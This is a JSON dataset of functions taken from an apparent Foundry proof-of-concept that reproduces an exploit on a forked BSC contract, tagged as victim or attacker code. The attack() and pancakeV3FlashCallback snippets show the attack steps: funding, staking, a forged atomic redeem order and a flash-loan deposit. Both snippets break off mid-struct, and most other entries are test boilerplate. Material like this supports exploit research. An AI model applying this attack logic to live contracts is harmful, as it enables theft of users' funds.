[
  {
    "contract/interface": "Routers",
    "source_type": "victim_contract",
    "function_name": "swapCompact",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "VulnContract",
    "source_type": "victim_contract",
    "function_name": "depositAssetTo",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "VulnContract",
    "source_type": "victim_contract",
    "function_name": "getBalances",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "VulnContract",
    "source_type": "victim_contract",
    "function_name": "getLiabilities",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "VulnContract",
    "source_type": "victim_contract",
    "function_name": "lockStake",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "VulnContract",
    "source_type": "victim_contract",
    "function_name": "redeemAtomic",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "VulnContract",
    "source_type": "victim_contract",
    "function_name": "requestReleaseStake",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "VulnContract",
    "source_type": "victim_contract",
    "function_name": "withdrawTo",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "alice",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "attack",
    "original_code": "    function attack() public {\n        // Step 1\n        address[] memory add = new address[](1);\n        add[0] = address(ORN);\n        (alice, alicePk) = makeAddrAndKey(\"alice\");\n        deal(address(ORN), address(alice), 10_000_000);\n        deal(address(BUSDT), address(alice), 1 ether);\n        deal(address(WBNB), address(alice), 0.005 ether);\n        vm.startPrank(alice);\n\n        // Step 2\n        BUSDT.approve(address(vulnContract), type(uint192).max);\n\n        vulnContract.depositAssetTo(address(BUSDT), 1 ether, address(alice));\n\n        ORN.approve(address(vulnContract), type(uint192).max);\n\n        vulnContract.depositAssetTo(address(ORN), 10_000_000, address(alice));\n\n        vulnContract.lockStake(10_000_000);\n\n        //Step 3\n        signerPrivateKey = 123_456;\n        attacker = vm.addr(signerPrivateKey);\n        bytes memory hash_1 = abi.encodePacked(\"test\");\n        LibAtomic.RedeemOrder memory order_1 = LibAtomic.RedeemOrder({\n            sender: address(alice),\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "counter",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "pancakeV3FlashCallback",
    "original_code": "    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {\n        BUSDT.approve(address(vulnContract), type(uint256).max);\n        vulnContract.depositAssetTo(address(BUSDT), 4_000_000 ether, address(attacker));\n\n        bytes memory Attackhash = abi.encodePacked(\"attack\");\n        LibAtomic.RedeemOrder memory attackorder = LibAtomic.RedeemOrder({\n            sender: address(attacker),\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", 39_104_878);\n        deal(address(BUSDT), address(this), 0);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\"[Begin] Attacker ORN balance before exploit\", ORN.balanceOf(address(this)), 8);\n        emit log_named_decimal_uint(\"[Begin] Attacker BNB balance before exploit\", address(this).balance, 18);\n        emit log_named_decimal_uint(\"[Begin] Attacker XRP balance before exploit\", XRP.balanceOf(address(this)), 18);\n        emit log_named_decimal_uint(\"[Begin] Attacker BUSDT balance before exploit\", BUSDT.balanceOf(address(this)), 18);\n        console.log(\"==============\");\n        attack();\n    }\n\n",
    "description": ""
  }
]